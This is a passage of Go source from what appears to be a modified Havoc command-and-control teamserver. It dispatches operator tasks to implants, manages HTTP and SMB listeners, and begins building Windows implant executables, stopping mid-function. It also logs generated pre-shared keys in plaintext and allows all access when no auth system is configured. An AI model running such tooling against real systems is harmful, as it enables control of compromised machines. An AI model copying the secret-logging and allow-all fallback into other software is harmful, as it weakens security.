package server

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"strconv"
	"strings"
	"time"

	"Havoc/pkg/agent"
	"Havoc/pkg/common/builder"
	"Havoc/pkg/events"
	"Havoc/pkg/handlers"
	"Havoc/pkg/logger"
	"Havoc/pkg/logr"
	"Havoc/pkg/packager"
)

// generateRandomPSK generates a cryptographically secure random PSK of given length (in bytes)
// Returns a hex-encoded string (so 16 bytes = 32 char hex string)
func generateRandomPSK(byteLength int) string {
	bytes := make([]byte, byteLength)
	if _, err := rand.Read(bytes); err != nil {
		// Fallback to a default if crypto/rand fails (shouldn't happen)
		return "default_psk_fallback_32char_key!"
	}
	return hex.EncodeToString(bytes)
}

func (t *Teamserver) DispatchEvent(pk packager.Package) {
	switch pk.Head.Event {

	case packager.Type.Session.Type:

		switch pk.Body.SubEvent {

		case packager.Type.Session.MarkAsDead:
			if AgentID, ok := pk.Body.Info["AgentID"]; ok {
				for i := range t.Agents.Agents {
					if t.Agents.Agents[i].NameID == AgentID {

						if val, ok := pk.Body.Info["Marked"]; ok {
							if val == "Dead" {
								t.Died(t.Agents.Agents[i])
							} else if val == "Alive" {
								t.Agents.Agents[i].Active = true
							}
							t.AgentUpdate(t.Agents.Agents[i])
						}
					}
				}
			}

			break

	case packager.Type.Session.Input:
		var (
			job       *agent.Job
			command   = 0
			AgentType = "Demon"
			err       error
			DemonID   string
			found     = false
		)

		if agentID, ok := pk.Body.Info["DemonID"].(string); ok {
			DemonID = agentID
		} else {
			logger.Debug("AgentID [" + agentID + "] not found")
			return
		}

		// Check if user has access to this agent
		var userHasAccess = false
		t.Clients.Range(func(key, value any) bool {
			client := value.(*Client)
			if client.Username == pk.Head.User {
				if client.SessionID != "" && t.AuthWrapper != nil {
					session, err := t.AuthWrapper.ValidateSession(client.SessionID)
					if err == nil && session != nil {
						userID := session.User.ID
						userRole := session.User.Role
						
						// Admin and operator: access all agents
						if userRole == "admin" || userRole == "operator" {
							userHasAccess = true
						} else if userRole == "agent-operator" {
							// Agent-operator: only assigned agents
							allowed, err := t.AuthWrapper.CheckAgentAccess(userID, DemonID)
							if err == nil && allowed {
								userHasAccess = true
							}
						}
					}
				} else {
					// Fallback: if no auth system, allow (legacy behavior)
					userHasAccess = true
				}
				return false
			}
			return true
		})
		
		if !userHasAccess {
			logger.Warn(fmt.Sprintf("User %s attempted to access agent %s without permission", pk.Head.User, DemonID))
			// Silently ignore - don't reveal agent exists
			return
		}

		for i := range t.Agents.Agents {

			if t.Agents.Agents[i].NameID == DemonID {
				found = true

					// handle demon session input
					// TODO: maybe move to own function ?
					// Check if this agent uses any valid demon magic value from our pool
					logger.Debug(fmt.Sprintf("Command Dispatch - Agent: %s, MagicValue: 0x%08x", DemonID, t.Agents.Agents[i].MagicValue))
					if agent.IsValidDemonMagic(t.Agents.Agents[i].MagicValue) {
						logger.Debug(fmt.Sprintf("Dispatch magic validation PASSED for agent %s (0x%08x)", DemonID, t.Agents.Agents[i].MagicValue))

						// Set the current operator for this agent
						t.Agents.Agents[i].CurrentOperator = pk.Head.User

						var (
							Message = new(map[string]string)
							Console = func(AgentID string, Message map[string]string) {
								var (
									out, _ = json.Marshal(Message)
									pk     = events.Demons.DemonOutput(DemonID, agent.HAVOC_CONSOLE_MESSAGE, string(out))
								)

								t.EventAppend(pk)
								t.EventBroadcast("", pk)
							}
						)

						if val, ok := pk.Body.Info["CommandID"]; ok {

							if pk.Body.Info["CommandID"] == "Python Plugin" {

								// TODO: move to own function.
								logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

								if pk.Head.OneTime == "true" {
									return
								}

								var backups = map[string]interface{}{
									"TaskID":      pk.Body.Info["TaskID"].(string),
									"DemonID":     DemonID,
									"CommandID":   "",
									"CommandLine": pk.Body.Info["CommandLine"].(string),
									"AgentType":   AgentType,
								}

								if _, ok := pk.Body.Info["CommandID"].(string); ok {
									backups["CommandID"] = pk.Body.Info["CommandID"]
								}

								if _, ok := pk.Body.Info["TaskMessage"].(string); ok {
									backups["TaskMessage"] = pk.Body.Info["TaskMessage"]
								}

								for k := range pk.Body.Info {
									delete(pk.Body.Info, k)
								}

								pk.Body.Info = backups

								t.EventAppend(pk)
								t.EventBroadcast(pk.Head.User, pk)

								return

							} else if pk.Body.Info["CommandID"] == "Teamserver" {

								// TODO: move to own function.
								logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

								var Command = pk.Body.Info["Command"].(string)

								if pk.Head.OneTime == "true" {
									return
								}

								var backups = map[string]interface{}{
									"TaskID":      pk.Body.Info["TaskID"].(string),
									"DemonID":     DemonID,
									"CommandID":   "",
									"CommandLine": pk.Body.Info["CommandLine"].(string),
									"AgentType":   AgentType,
								}

								if _, ok := pk.Body.Info["CommandID"].(string); ok {
									backups["CommandID"] = pk.Body.Info["CommandID"]
								}

								for k := range pk.Body.Info {
									delete(pk.Body.Info, k)
								}

								pk.Body.Info = backups

								t.EventAppend(pk)
								t.EventBroadcast(pk.Head.User, pk)

								if err = t.Agents.Agents[i].TeamserverTaskPrepare(Command, Console); err != nil {
									Console(t.Agents.Agents[i].NameID, map[string]string{
										"Type":    "Error",
										"Message": "Failed to create Task: " + err.Error(),
									})
									return
								}

								return

							} else {

								// TODO: move to own function.
								command, err = strconv.Atoi(val.(string))
								if err != nil {

									logger.Error("Failed to convert CommandID to integer: " + err.Error())
									command = 0

								} else {
									*Message = make(map[string]string)

									var ClientID string
									ClientID = ""
									t.Clients.Range(func(key, value any) bool {
										client := value.(*Client)
										if client.Username == pk.Head.User {
											ClientID = client.ClientID
											return false
										}
										return true
									})

									job, err = t.Agents.Agents[i].TaskPrepare(command, pk.Body.Info, Message, ClientID, t)
									if err != nil {
										Console(t.Agents.Agents[i].NameID, map[string]string{
											"Type":    "Error",
											"Message": "Failed to create Task: " + err.Error(),
										})
										return
									}

									if job != nil {
										t.Agents.Agents[i].AddJobToQueue(*job)
									}

									if t.Agents.Agents[i].Pivots.Parent != nil {
										logr.LogrInstance.AddAgentInput("Demon", t.Agents.Agents[i].NameID, pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

									} else {
										logr.LogrInstance.AddAgentInput("Demon", pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))
									}

									if pk.Head.OneTime == "true" {
										return
									}

									var backups = map[string]interface{}{
										"TaskID":      pk.Body.Info["TaskID"].(string),
										"DemonID":     DemonID,
										"CommandID":   "",
										"CommandLine": pk.Body.Info["CommandLine"].(string),
										"AgentType":   AgentType,
									}

									if _, ok := pk.Body.Info["CommandID"].(string); ok {
										backups["CommandID"] = pk.Body.Info["CommandID"]
									}

									for k := range pk.Body.Info {
										delete(pk.Body.Info, k)
									}

									pk.Body.Info = backups

									t.EventAppend(pk)
									t.EventBroadcast(pk.Head.User, pk)

									if Message != nil {
										Console(t.Agents.Agents[i].NameID, *Message)
									}

									return
								}
							}
						}

					} else {
						// Magic value validation failed
						logger.Debug(fmt.Sprintf("Dispatch magic validation FAILED for agent %s (0x%08x) - not in demon pool", DemonID, t.Agents.Agents[i].MagicValue))

						for _, a := range t.Service.Agents {
							if a.MagicValue == fmt.Sprintf("0x%x", t.Agents.Agents[i].MagicValue) {
								logger.Debug(fmt.Sprintf("Found agent type %s for magic 0x%08x", a.Name, t.Agents.Agents[i].MagicValue))

								// Set agent type
								AgentType = a.Name

								if pk.Body.Info["CommandID"] == "Python Plugin" {
									logr.LogrInstance.AddAgentInput(AgentType, pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))

									if pk.Head.OneTime == "true" {
										return
									}

									var backups = map[string]interface{}{
										"TaskID":      pk.Body.Info["TaskID"].(string),
										"DemonID":     DemonID,
										"CommandID":   "",
										"CommandLine": pk.Body.Info["CommandLine"].(string),
										"AgentType":   AgentType,
									}

									if _, ok := pk.Body.Info["CommandID"].(string); ok {
										backups["CommandID"] = pk.Body.Info["CommandID"]
									}

									if _, ok := pk.Body.Info["TaskMessage"].(string); ok {
										backups["TaskMessage"] = pk.Body.Info["TaskMessage"]
									}

									for k := range pk.Body.Info {
										delete(pk.Body.Info, k)
									}

									pk.Body.Info = backups

									t.EventAppend(pk)
									t.EventBroadcast(pk.Head.User, pk)

									return

								} else {
									// Send command to agent service
									a.SendTask(pk.Body.Info, t.Agents.Agents[i].ToMap())

									// log agent input
									logr.LogrInstance.AddAgentInput(a.Name, pk.Body.Info["DemonID"].(string), pk.Head.User, pk.Body.Info["TaskID"].(string), pk.Body.Info["CommandLine"].(string), time.Now().UTC().Format("02/01/2006 15:04:05"))
								}

							}
						}
					}
					break
				}
			}

			if found == false {
				logger.Error(fmt.Sprintf("The AgentID %s was not found", DemonID))
				return
			}

			if pk.Head.OneTime == "true" {
				return
			}

			var backups = map[string]interface{}{
				"TaskID":      pk.Body.Info["TaskID"].(string),
				"DemonID":     DemonID,
				"CommandID":   "",
				"CommandLine": pk.Body.Info["CommandLine"].(string),
				"AgentType":   AgentType,
			}

			if _, ok := pk.Body.Info["CommandID"].(string); ok {
				backups["CommandID"] = pk.Body.Info["CommandID"]
			}

			for k := range pk.Body.Info {
				delete(pk.Body.Info, k)
			}

			pk.Body.Info = backups

			t.EventAppend(pk)
			t.EventBroadcast(pk.Head.User, pk)
		}

	case packager.Type.Chat.Type:

		switch pk.Body.SubEvent {

		case packager.Type.Chat.NewMessage:
			t.EventBroadcast("", pk)
			break

		case packager.Type.Chat.NewSession:
			t.EventBroadcast("", pk)
			break

		case packager.Type.Chat.NewListener:
			t.EventBroadcast("", pk)
			break

		}

	case packager.Type.Listener.Type:
		switch pk.Body.SubEvent {

		case packager.Type.Listener.Add:
			// Check if user has permission to manage listeners
			var userHasPermission = false
			t.Clients.Range(func(key, value any) bool {
				client := value.(*Client)
				if client.Username == pk.Head.User {
					if client.SessionID != "" && t.AuthWrapper != nil {
						session, err := t.AuthWrapper.ValidateSession(client.SessionID)
						if err != nil {
							// Session expired but WebSocket still connected - try to refresh
							logger.Info(fmt.Sprintf("[AUTH] Session expired for user %s, attempting refresh", pk.Head.User))
							newSession, refreshErr := t.AuthWrapper.RefreshSessionForConnectedClient(client.Username, client.GlobalIP, "WebSocket")
							if refreshErr == nil && newSession != nil {
								// Success! Update client's SessionID
								client.SessionID = newSession.SessionID
								logger.Good(fmt.Sprintf("[AUTH] Successfully refreshed session for user %s", pk.Head.User))
								session = newSession
							} else {
								logger.Warn(fmt.Sprintf("Session validation failed for user %s: %v - denying access", pk.Head.User, err))
								userHasPermission = false
								return false
							}
						}
						
						if session != nil {
							userRole := session.User.Role
							logger.Debug(fmt.Sprintf("[DEBUG] User %s has role '%s'", pk.Head.User, userRole))
							// Only admin and operator can manage listeners
							if userRole == "admin" || userRole == "operator" {
								userHasPermission = true
								logger.Debug(fmt.Sprintf("[DEBUG] User %s GRANTED listener permission (role: %s)", pk.Head.User, userRole))
							} else {
								logger.Debug(fmt.Sprintf("[DEBUG] User %s DENIED listener permission (role: %s)", pk.Head.User, userRole))
							}
						}
					} else {
						// Fallback: if no auth system, allow (legacy behavior)
						logger.Debug(fmt.Sprintf("[DEBUG] No SessionID or AuthWrapper for user %s - legacy mode", pk.Head.User))
						userHasPermission = true
					}
					return false
				}
				return true
			})
			
			if !userHasPermission {
				logger.Warn(fmt.Sprintf("User %s attempted to add listener without permission", pk.Head.User))
				t.Clients.Range(func(key, value any) bool {
					id := key.(string)
					client := value.(*Client)
					if client.Username == pk.Head.User {
						err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, "", errors.New("insufficient permissions: only admin and operator roles can manage listeners")))
						if err != nil {
							logger.Error("Failed to send error: " + err.Error())
						}
						return false
					}
					return true
				})
				return
			}

			var Protocol = pk.Body.Info["Protocol"].(string)

			switch Protocol {

			case handlers.AGENT_HTTP, handlers.AGENT_HTTPS:

				var (
					HostBind string
					Hosts    []string
					Headers  []string
					Uris     []string
					val      string
					ok       bool
				)

				HostBind = pk.Body.Info["HostBind"].(string)

				for _, s := range strings.Split(pk.Body.Info["Hosts"].(string), ", ") {
					if len(s) > 0 {
						Hosts = append(Hosts, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Headers"].(string), ", ") {
					if len(s) > 0 {
						Headers = append(Headers, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Uris"].(string), ", ") {
					if len(s) > 0 {
						Uris = append(Uris, s)
					}
				}

				var Config = handlers.HTTPConfig{
					Name:         pk.Body.Info["Name"].(string),
					Hosts:        Hosts,
					HostBind:     HostBind,
					HostRotation: pk.Body.Info["HostRotation"].(string),
					PortBind:     pk.Body.Info["PortBind"].(string),
					PortConn:     pk.Body.Info["PortConn"].(string),
					Headers:      Headers,
					Uris:         Uris,
					HostHeader:   pk.Body.Info["HostHeader"].(string),
					UserAgent:    pk.Body.Info["UserAgent"].(string),
					BehindRedir:  t.Profile.Config.Demon.TrustXForwardedFor,
				}

				if val, ok := pk.Body.Info["Proxy Enabled"].(string); ok {
					Config.Proxy.Enabled = false

					if val == "true" {
						Config.Proxy.Enabled = true

						if val, ok = pk.Body.Info["Proxy Type"].(string); ok {
							Config.Proxy.Type = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy type not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Host"].(string); ok {
							Config.Proxy.Host = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy host not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Port"].(string); ok {
							Config.Proxy.Port = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy port not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Username"].(string); ok {
							Config.Proxy.Username = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy username not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Password"].(string); ok {
							Config.Proxy.Password = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy password not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}
					}
				}

				if val, ok = pk.Body.Info["PSK"].(string); ok {
					Config.PSK = strings.TrimSpace(val)
				}
				// Auto-generate PSK if missing or too short (need 32 chars minimum)
				if len(Config.PSK) < 32 {
					Config.PSK = generateRandomPSK(16) // 16 bytes = 32 hex chars
					logger.Info(fmt.Sprintf("Auto-generated PSK for HTTP listener '%s': %s", Config.Name, Config.PSK))
				}

				if pk.Body.Info["Secure"].(string) == "true" {
					Config.Secure = true
				}

				if err := t.ListenerStart(handlers.LISTENER_HTTP, Config); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			case handlers.AGENT_PIVOT_SMB:
				var (
					SmdConfig handlers.SMBConfig
					found     bool
					val       string
					ok        bool
				)

				SmdConfig.Name, found = pk.Body.Info["Name"].(string)
				if !found {
					SmdConfig.Name = ""
				}

				SmdConfig.PipeName, found = pk.Body.Info["PipeName"].(string)
				if !found {
					SmdConfig.Name = ""
				}

				if val, ok = pk.Body.Info["PSK"].(string); ok {
					SmdConfig.PSK = strings.TrimSpace(val)
				}
				// Auto-generate PSK if missing or too short (need 32 chars minimum)
				if len(SmdConfig.PSK) < 32 {
					SmdConfig.PSK = generateRandomPSK(16) // 16 bytes = 32 hex chars
					logger.Info(fmt.Sprintf("Auto-generated PSK for SMB listener '%s': %s", SmdConfig.Name, SmdConfig.PSK))
				}

				if err := t.ListenerStart(handlers.LISTENER_PIVOT_SMB, SmdConfig); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			case handlers.AGENT_EXTERNAL:
				var (
					ExtConfig handlers.ExternalConfig
					found     bool
				)

				ExtConfig.Name, found = pk.Body.Info["Name"].(string)
				if !found {
					ExtConfig.Name = ""
				}

				ExtConfig.Endpoint, found = pk.Body.Info["Endpoint"].(string)
				if !found {
					logger.Error("Listener SMB Pivot: Endpoint not specified")
					return
				}

				if err := t.ListenerStart(handlers.LISTENER_EXTERNAL, ExtConfig); err != nil {
					t.Clients.Range(func(key, value any) bool {
						id := key.(string)
						client := value.(*Client)
						if client.Username == pk.Head.User {
							err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), err))
							if err != nil {
								logger.Error("Failed to send Event: " + err.Error())
							}
							return false
						}
						return true
					})
				}

				break

			default:

				// check if the service endpoint is up and available
				if t.Service != nil {

					for _, listener := range t.Service.Listeners {

						if Protocol == listener.Name {

							var (
								ListenerName string
								err          error
							)

							// retrieve the listener name
							if val, ok := pk.Body.Info["Name"]; ok {
								ListenerName = val.(string)
							}

							// try to start the listener.
							if err = listener.Start(pk.Body.Info); err != nil {
								t.EventListenerError(ListenerName, err)
							}

							// append the listener to the teamserver listener array
							t.Listeners = append(t.Listeners, &Listener{
								Name: ListenerName,
								Type: handlers.LISTENER_SERVICE,
								Config: handlers.Service{
									Service: listener,
									Info:    pk.Body.Info,
								},
							})

							// break from this switch
							return
						}

					}

				}

				// didn't found the protocol type so just abort
				logger.Error("Listener Type not found: ", Protocol)

				break
			}

			break

		case packager.Type.Listener.Remove:
			// Check if user has permission to manage listeners
			var userHasPermission = false
			t.Clients.Range(func(key, value any) bool {
				client := value.(*Client)
				if client.Username == pk.Head.User {
					if client.SessionID != "" && t.AuthWrapper != nil {
						session, err := t.AuthWrapper.ValidateSession(client.SessionID)
						if err != nil {
							// Session expired but WebSocket still connected - try to refresh
							logger.Info(fmt.Sprintf("[AUTH] Session expired for user %s, attempting refresh", pk.Head.User))
							newSession, refreshErr := t.AuthWrapper.RefreshSessionForConnectedClient(client.Username, client.GlobalIP, "WebSocket")
							if refreshErr == nil && newSession != nil {
								// Success! Update client's SessionID
								client.SessionID = newSession.SessionID
								logger.Good(fmt.Sprintf("[AUTH] Successfully refreshed session for user %s", pk.Head.User))
								session = newSession
							} else {
								logger.Warn(fmt.Sprintf("Session validation failed for user %s: %v - denying access", pk.Head.User, err))
								userHasPermission = false
								return false
							}
						}
						
						if session != nil {
							userRole := session.User.Role
							logger.Debug(fmt.Sprintf("[DEBUG] User %s has role '%s'", pk.Head.User, userRole))
							// Only admin and operator can manage listeners
							if userRole == "admin" || userRole == "operator" {
								userHasPermission = true
								logger.Debug(fmt.Sprintf("[DEBUG] User %s GRANTED listener permission (role: %s)", pk.Head.User, userRole))
							} else {
								logger.Debug(fmt.Sprintf("[DEBUG] User %s DENIED listener permission (role: %s)", pk.Head.User, userRole))
							}
						}
					} else {
						// Fallback: if no auth system, allow (legacy behavior)
						logger.Debug(fmt.Sprintf("[DEBUG] No SessionID or AuthWrapper for user %s - legacy mode", pk.Head.User))
						userHasPermission = true
					}
					return false
				}
				return true
			})
			
			if !userHasPermission {
				logger.Warn(fmt.Sprintf("User %s attempted to remove listener without permission", pk.Head.User))
				t.Clients.Range(func(key, value any) bool {
					id := key.(string)
					client := value.(*Client)
					if client.Username == pk.Head.User {
						err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, "", errors.New("insufficient permissions: only admin and operator roles can manage listeners")))
						if err != nil {
							logger.Error("Failed to send error: " + err.Error())
						}
						return false
					}
					return true
				})
				return
			}

			if val, ok := pk.Body.Info["Name"]; ok {
				listenerName := val.(string)
				logger.Info(fmt.Sprintf("User %s removing listener %s", pk.Head.User, listenerName))
				
				t.ListenerRemove(listenerName)

				var p = events.Listener.ListenerRemove(listenerName)

				t.EventAppend(p)
				t.EventBroadcast("", p)
				
				logger.Info(fmt.Sprintf("Listener %s removed and broadcasted", listenerName))
			}

			break

		case packager.Type.Listener.Edit:
			// Check if user has permission to manage listeners
			var userHasPermission = false
			t.Clients.Range(func(key, value any) bool {
				client := value.(*Client)
				if client.Username == pk.Head.User {
					if client.SessionID != "" && t.AuthWrapper != nil {
						session, err := t.AuthWrapper.ValidateSession(client.SessionID)
						if err != nil {
							// Session expired but WebSocket still connected - try to refresh
							logger.Info(fmt.Sprintf("[AUTH] Session expired for user %s, attempting refresh", pk.Head.User))
							newSession, refreshErr := t.AuthWrapper.RefreshSessionForConnectedClient(client.Username, client.GlobalIP, "WebSocket")
							if refreshErr == nil && newSession != nil {
								// Success! Update client's SessionID
								client.SessionID = newSession.SessionID
								logger.Good(fmt.Sprintf("[AUTH] Successfully refreshed session for user %s", pk.Head.User))
								session = newSession
							} else {
								logger.Warn(fmt.Sprintf("Session validation failed for user %s: %v - denying access", pk.Head.User, err))
								userHasPermission = false
								return false
							}
						}
						
						if session != nil {
							userRole := session.User.Role
							logger.Debug(fmt.Sprintf("[DEBUG] User %s has role '%s'", pk.Head.User, userRole))
							// Only admin and operator can manage listeners
							if userRole == "admin" || userRole == "operator" {
								userHasPermission = true
								logger.Debug(fmt.Sprintf("[DEBUG] User %s GRANTED listener permission (role: %s)", pk.Head.User, userRole))
							} else {
								logger.Debug(fmt.Sprintf("[DEBUG] User %s DENIED listener permission (role: %s)", pk.Head.User, userRole))
							}
						}
					} else {
						// Fallback: if no auth system, allow (legacy behavior)
						logger.Debug(fmt.Sprintf("[DEBUG] No SessionID or AuthWrapper for user %s - legacy mode", pk.Head.User))
						userHasPermission = true
					}
					return false
				}
				return true
			})
			
			if !userHasPermission {
				logger.Warn(fmt.Sprintf("User %s attempted to edit listener without permission", pk.Head.User))
				t.Clients.Range(func(key, value any) bool {
					id := key.(string)
					client := value.(*Client)
					if client.Username == pk.Head.User {
						err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, "", errors.New("insufficient permissions: only admin and operator roles can manage listeners")))
						if err != nil {
							logger.Error("Failed to send error: " + err.Error())
						}
						return false
					}
					return true
				})
				return
			}

			var Protocol = pk.Body.Info["Protocol"].(string)
			switch Protocol {

			case handlers.AGENT_HTTP, handlers.AGENT_HTTPS:
				var (
					HostBind string
					Hosts    []string
					Headers  []string
					Uris     []string
				)

				HostBind = pk.Body.Info["HostBind"].(string)

				for _, s := range strings.Split(pk.Body.Info["Hosts"].(string), ", ") {
					if len(s) > 0 {
						Hosts = append(Hosts, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Headers"].(string), ", ") {
					if len(s) > 0 {
						Headers = append(Headers, s)
					}
				}

				for _, s := range strings.Split(pk.Body.Info["Uris"].(string), ", ") {
					if len(s) > 0 {
						Uris = append(Uris, s)
					}
				}

				var Config = handlers.HTTPConfig{
					Name:         pk.Body.Info["Name"].(string),
					Hosts:        Hosts,
					HostBind:     HostBind,
					HostRotation: pk.Body.Info["HostRotation"].(string),
					PortBind:     pk.Body.Info["PortBind"].(string),
					PortConn:     pk.Body.Info["PortConn"].(string),
					Headers:      Headers,
					Uris:         Uris,
					HostHeader:   pk.Body.Info["HostHeader"].(string),
					UserAgent:    pk.Body.Info["UserAgent"].(string),
				}

				if val, ok := pk.Body.Info["Proxy Enabled"].(string); ok {
					Config.Proxy.Enabled = false

					if val == "true" {
						Config.Proxy.Enabled = true

						if val, ok = pk.Body.Info["Proxy Type"].(string); ok {
							Config.Proxy.Type = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy type not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Host"].(string); ok {
							Config.Proxy.Host = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy host not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
						}

						if val, ok = pk.Body.Info["Proxy Port"].(string); ok {
							Config.Proxy.Port = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy port not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Username"].(string); ok {
							Config.Proxy.Username = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy username not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}

						if val, ok = pk.Body.Info["Proxy Password"].(string); ok {
							Config.Proxy.Password = val
						} else {
							t.Clients.Range(func(key, value any) bool {
								id := key.(string)
								client := value.(*Client)
								if client.Username == pk.Head.User {
									err := t.SendEvent(id, events.Listener.ListenerError(pk.Head.User, pk.Body.Info["Name"].(string), errors.New("proxy password not specified")))
									if err != nil {
										logger.Error("Failed to send Event: " + err.Error())
									}
									return false
								}
								return true
							})
							return
						}
					}
				}

				if pk.Body.Info["Secure"].(string) == "true" {
					Config.Secure = true
				}

				t.ListenerEdit(handlers.LISTENER_HTTP, Config)

				var p = events.Listener.ListenerEdit(handlers.LISTENER_HTTP, &Config)

				t.EventAppend(p)
				t.EventBroadcast("", p)

				break

			}

			break
		}

	case packager.Type.Gate.Type:

		switch pk.Body.SubEvent {
		case packager.Type.Gate.Stageless:
			var (
				AgentType      = pk.Body.Info["AgentType"].(string)
				ListenerName   = pk.Body.Info["Listener"].(string)
				Arch           = pk.Body.Info["Arch"].(string)
				Format         = pk.Body.Info["Format"].(string)
				Config         = pk.Body.Info["Config"].(string)
				SendConsoleMsg func(MsgType, Message string)
				ClientID       string
			)

			t.Clients.Range(func(key, value any) bool {
				Client := value.(*Client)
				if Client.Username == pk.Head.User {
					ClientID = Client.ClientID
					return false
				}
				return true
			})

			SendConsoleMsg = func(MsgType, Message string) {
				err := t.SendEvent(ClientID, events.Gate.SendConsoleMessage(MsgType, Message))
				if err != nil {
					logger.Error("Couldn't send Event: " + err.Error())
					return
				}
			}

			if AgentType == "Demon" {
				go func() {
					var ConfigMap = make(map[string]any)

					err := json.Unmarshal([]byte(Config), &ConfigMap)
					if err != nil {
						logger.Error("Failed to Unmarshal json to object: " + err.Error())
						return
					}

					var PayloadBuilder = builder.NewBuilder(builder.BuilderConfig{
						Compiler64: t.Settings.Compiler64,
						Compiler86: t.Settings.Compiler32,
						Nasm:       t.Settings.Nasm,
						DebugDev:   t.Flags.Server.DebugDev,
						SendLogs:   t.Flags.Server.SendLogs,
					})

					PayloadBuilder.ClientId = ClientID

					if PayloadBuilder.ClientId == "" {
						logger.Error("Couldn't find the Client")
						return
					}

					PayloadBuilder.SendConsoleMessage = SendConsoleMsg

					err = PayloadBuilder.SetConfig(Config)
					if err != nil {
						return
					}

					if Arch == "x64" {
						PayloadBuilder.SetArch(builder.ARCHITECTURE_X64)
					} else {
						PayloadBuilder.SetArch(builder.ARCHITECTURE_X86)
					}

					var Ext string
					logger.Debug(Format)
					if Format == "Windows Exe" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_EXE)
						Ext = ".exe"
					} else if Format == "Windows Service Exe" {
						PayloadBuilder.SetFormat(builder.FILETYPE_WINDOWS_SERVICE_EXE)
						Ext = ".exe"
